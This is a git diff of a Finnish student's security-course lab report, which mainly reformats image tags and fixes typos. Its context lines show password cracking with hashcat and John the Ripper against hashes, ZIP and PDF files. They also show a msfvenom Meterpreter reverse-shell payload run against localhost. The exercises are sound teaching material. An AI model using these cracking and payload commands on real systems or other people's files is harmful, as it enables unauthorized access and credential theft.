@@ -61,7 +61,7 @@ tar xf rockyou.txt.tar.gz
 rm rockyou.txt.tar.gz
 ```
 
-![a2](https://github.com/user-attachments/assets/4f268376-e79f-4749-8861-091313df6045)
+<img src="https://github.com/user-attachments/assets/4f268376-e79f-4749-8861-091313df6045" width="500"> <br/>
 
 Tämän jälkeen loin esimerkkihashin murtamista varten. Varmistin että käyttämäni sana varmasti löytyy sanakirjasta poimimalla satunnaisesta rivistä sanasanan. Jotta en näe käyttämääni sanaa, putkitin perään ```sha1sum``` -komennon. 
 
@@ -81,7 +81,7 @@ Seuraavaksi tunnistetaan mitä moodia pitää käyttää hashin purkamiseksi
 hashid -m '82eeba1f2783a67ccb954e1fe51e2ee863084784'
 ```
 
-![a3](https://github.com/user-attachments/assets/d958e05b-2b5f-46fe-9637-77a987ff668a)
+<img src="https://github.com/user-attachments/assets/d958e05b-2b5f-46fe-9637-77a987ff668a" width="500"> <br/>
 
 ```SHA-1 [Hashcat Mode: 100]``` on siis tulos, joka täytyy ottaa huomioon. Hyvä huomata, että hashcat ehdottaa useampaa moodia. Muista vaihtoehdoista ei tässä tapauksesta tarvitse tässä välittää, sillä tiesimme käytetyn hash funktion jo ennakkoon. 
 
@@ -89,7 +89,7 @@ hashid -m '82eeba1f2783a67ccb954e1fe51e2ee863084784'
 hashcat -m 100 '82eeba1f2783a67ccb954e1fe51e2ee863084784' rockyou.txt -o tulos
 ```
 
-![a4](https://github.com/user-attachments/assets/26f477ac-dc84-459f-949a-009e88771e67)
+<img src="https://github.com/user-attachments/assets/26f477ac-dc84-459f-949a-009e88771e67" width="500"> <br/>
 
 Lopuksi tarkastetaan minkä salasanan hashcat löysi
 
@@ -97,7 +97,7 @@ Lopuksi tarkastetaan minkä salasanan hashcat löysi
 cat tulos 
 ```
 
-![a5](https://github.com/user-attachments/assets/9a13fdb7-48cf-4e7e-88d9-58edc779687d)
+<img src="https://github.com/user-attachments/assets/9a13fdb7-48cf-4e7e-88d9-58edc779687d" width="500"> <br/>
 
 ```bash
 82eeba1f2783a67ccb954e1fe51e2ee863084784:ramirez
@@ -121,10 +121,10 @@ Awk on tekstin prosessointiin ja suodatukseen käytetty työkalu. Sen avulla tek
 Lyhyt selitys vielä, jos ```awk``` -komento ei ole tuttu:     
 ```awk``` = työkalun nimi    
 ```NR==1337``` = Number of Record eli rivi 1337    
-```{printf "%s", $0}``` = Print string, tässä tapauksessa halutaan pelkästään sana. Ilman tätä mukaan saattaisi tulla rivin lopussa oleva rivinvaihto. Mikäli tarkoituksena voin tulostaa valittu rivi, ei tätä tarvita mutta emme halua hashiin mukaan rivinvaihtoa.    
+```{printf "%s", $0}``` = Print string, tässä tapauksessa halutaan pelkästään sana. Ilman tätä mukaan saattaisi tulla rivin lopussa oleva rivinvaihto. Mikäli tarkoituksena on vain tulostaa valittu rivi, ei tätä tarvita mutta emme halua hashiin mukaan rivinvaihtoa.    
 ```rockyou.txt``` = kohdetiedosto, jolle suodatus tehdään    
 
-Aiemmassa tehtävässä oleellista on, että rivinvaihto sisällyttäminen johtaa eri hashiin. 
+Aiemmassa tehtävässä oleellista on, että rivinvaihdon sisällyttäminen johtaa eri hashiin. 
 
 ```bash
 awk 'NR==1337' rockyou.txt | sha1sum
@@ -150,13 +150,13 @@ Siirryin John the Ripperin asennukseen. Ohjeistan poiketen, asensin john the rip
 apt-cache search 'john the ripper'
 ```
 
-![c1](https://github.com/user-attachments/assets/45dd3ab7-cffa-4c62-ba40-ab0a323c61a3)
+<img src="https://github.com/user-attachments/assets/45dd3ab7-cffa-4c62-ba40-ab0a323c61a3" width="500"> <br/>
 
 ```bash
 sudo apt-get install 'john'
 ```
 
-![c2](https://github.com/user-attachments/assets/0f6867ef-4a9a-4cc0-95cd-78a3becd95e8)
+<img src="https://github.com/user-attachments/assets/0f6867ef-4a9a-4cc0-95cd-78a3becd95e8" width="500"> <br/>
 
 Se olikin jo valmiiksi asennettuna Kaliin. Loin ensin kansion John the Ripperille sekä esimerkkitiedoston. 
 
@@ -188,7 +188,7 @@ Lopuksi tarkastan vielä, etten pysty sitä purkamaan.
 unzip secret.zip
 ```
 
-![c3](https://github.com/user-attachments/assets/71b5a965-47a7-4adb-a1c0-bf8920829278)
+<img src="https://github.com/user-attachments/assets/71b5a965-47a7-4adb-a1c0-bf8920829278" width="500"> <br/>
 
 Purkaminen vaatii siis salasanan, jota minulla ei vielä ole. 
 
@@ -202,7 +202,7 @@ zip2john secret.zip > secret.zip.hash
 cat secret.zip.hash
 ```
 
-![c4](https://github.com/user-attachments/assets/a785907b-bb22-4741-93ad-31d8fb902346)
+<img src="https://github.com/user-attachments/assets/a785907b-bb22-4741-93ad-31d8fb902346" width="500"> <br/>
 
 Nyt kun tiedostosta onnistuneesti luotu hash, joidaan aloittaa sen murtaminen John the Ripperillä. 
 
@@ -211,7 +211,7 @@ Nyt kun tiedostosta onnistuneesti luotu hash, joidaan aloittaa sen murtaminen Jo
 john secret.zip.hash
 ```
 
-![c5](https://github.com/user-attachments/assets/884e38fb-9a10-4f1a-a97c-48725204f00e)
+<img src="https://github.com/user-attachments/assets/884e38fb-9a10-4f1a-a97c-48725204f00e" width="500"> <br/>
 
 Salasana näyttäisi olevan John the Ripperin mukaan ```katelynn```, joten tarkastetaan vielä lopuksi oliko sanasana oikein. 
 
@@ -243,7 +243,7 @@ pdf2john PDF-Example-Password.pdf > pdf.hash
 cat pdf.hash
 ```
 
-![e1](https://github.com/user-attachments/assets/f7ecbdaa-ed44-4197-87f0-32a2aa4e0a1e)
+<img src="https://github.com/user-attachments/assets/f7ecbdaa-ed44-4197-87f0-32a2aa4e0a1e" width="500"> <br/>
 
 Tämän jälkeen voi aloittaa John the Ripperillä murtamisen jälleen
 
@@ -251,13 +251,13 @@ Tämän jälkeen voi aloittaa John the Ripperillä murtamisen jälleen
 john pdf.hash
 ```
 
-![e2](https://github.com/user-attachments/assets/197f85f2-b908-415e-a87e-0ba57703b250)
+<img src="https://github.com/user-attachments/assets/197f85f2-b908-415e-a87e-0ba57703b250" width="500"> <br/>
 
 Salasana olisi John the Ripperin mukaan ```test```. avasin vielä PDF:n ja kokeilin salasanaa todentaakseni sen oikeellisuuden. 
 
-![e3](https://github.com/user-attachments/assets/38c588ab-5389-4ad9-8166-af474f588c60)
+<img src="https://github.com/user-attachments/assets/38c588ab-5389-4ad9-8166-af474f588c60" width="500"> <br/>
 
-![e4](https://github.com/user-attachments/assets/024350db-a5f1-49e8-ada1-6c72591aa468)
+<img src="https://github.com/user-attachments/assets/024350db-a5f1-49e8-ada1-6c72591aa468" width="500"> <br/>
 
 Tiedosto aukesi salasanalla ```test```, joten voidaan todeta löydetyn salasanan olleen oikea. 
 
@@ -271,7 +271,7 @@ Aloitetaan tunnistamalla hash.
 hashid -m 'e4fa1555ad877bf0ec455483371867200eee89550a93eff2f95a6198'
 ```
 
-![f1](https://github.com/user-attachments/assets/06d33b93-a836-4567-9528-b884c656b392)
+<img src="https://github.com/user-attachments/assets/06d33b93-a836-4567-9528-b884c656b392" width="500"> <br/>
 
 Sillä hashid ei kertonut mitä moodia kannattaa käyttää, hain listauksen moodeista ```hashcat --help```:llä ja suodatin listauksesta ylimääräiset ```grep```:llä. 
 
@@ -279,7 +279,7 @@ Sillä hashid ei kertonut mitä moodia kannattaa käyttää, hain listauksen moo
 hashcat --help | grep '224'
 ```
 
-![f2](https://github.com/user-attachments/assets/33eef6a4-d847-489c-9c64-91453f6ca277)
+<img src="https://github.com/user-attachments/assets/33eef6a4-d847-489c-9c64-91453f6ca277" width="500"> <br/>
 
 SHA-224:lle löytyi kaksi hyvää vaihtoehtoa ```1300 | SHA2-224``` ja ```17300 | SHA3-224```. Lähdetään kokeilemaan onnistuuko kummallakaan näistä moodeista murtaminen. 
 
@@ -293,7 +293,7 @@ Kun hashcat oli ajanut loppuun, katsoin vielä selvitetyn salasanan
 cat tulos2
 ```
 
-![f3](https://github.com/user-attachments/assets/6226e06c-64d6-4491-9b5b-f9e938b4f666)
+<img src="https://github.com/user-attachments/assets/6226e06c-64d6-4491-9b5b-f9e938b4f666" width="500"> <br/>
 
 Salasana oli siis ```hashcat```. 
 
@@ -329,7 +329,7 @@ Tämän jälkeen ajoin komennon, jolla voi luoda haittaohjelman [dokumentaation]
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8 -f elf -o malware.elf
 ```
 
-![g2](https://github.com/user-attachments/assets/86710d46-8716-469f-bc3d-65741bf82ecd)
+<img src="https://github.com/user-attachments/assets/86710d46-8716-469f-bc3d-65741bf82ecd" width="500"> <br/>
 
 
 Tehtävänannossa ei pyydetty ajamaan haittaohjelmaa, mutta halusin nähdä miten se toimii käytännössä. 
@@ -340,7 +340,7 @@ Tämän jälkeen avasin toisesssa terminaalissa mfsconsolen, jotta voin asettaa 
 msfconsole
 ```
 
-![g3](https://github.com/user-attachments/assets/39002926-1add-4eba-8e50-1baf8cc888ef)
+<img src="https://github.com/user-attachments/assets/39002926-1add-4eba-8e50-1baf8cc888ef" width="500"> <br/>
 
 Tämän jälkeen määrittelin mfsconsoleen mitä kuunnellaan alkuperäisen payloadin perusteella. 
 
@@ -370,7 +370,7 @@ mv malware.elf tainted.elf
 
 Nyt näyttäisi suostuneen muuttaa oikeudet ja ajaa haittaohjelman. Palataan katsomaan mitä msfconsole näyttää. 
 
-![g4](https://github.com/user-attachments/assets/5c813163-4735-433e-969f-e61476799533)
+<img src="https://github.com/user-attachments/assets/5c813163-4735-433e-969f-e61476799533" width="500"> <br/>
 
 Yhteys koneeseen näyttäisi muodostuneen, joten sen jälkeen voitaisiin lähteä kohdekonetta käyttämään hyväksi. Kokeilin muutamaa komentoa testiksi. 
 
@@ -384,19 +384,16 @@ sysinfo
 ls
 ```
 
-![g6](https://github.com/user-attachments/assets/9a3adfcb-7aa8-4d9e-be84-bdd5c8673723)
+<img src="https://github.com/user-attachments/assets/9a3adfcb-7aa8-4d9e-be84-bdd5c8673723" width="500"> <br/>
 
 Tämän avulla voitaisiin siis navigoida koneella, siepata koneelta haluttavat tiedot tai käskeä kohdekonetta tekemään haluttavat toimenpiteet. 
-
-<img src="
-" width="500"> <br/>
 
 
 ## Ajankäyttö: 
 
 - Materiaalien lukemiseen ja tiivistämiseen n. 2h
-- Tehtäviin n. h. 
-- Raportointiin ja dokumentointiin n. h. 
+- Tehtäviin ja materiaalien lukemiseen n. 3h. 
+- Raportointiin ja dokumentointiin n. 2h. 
 
 ## Lähteet: 
 
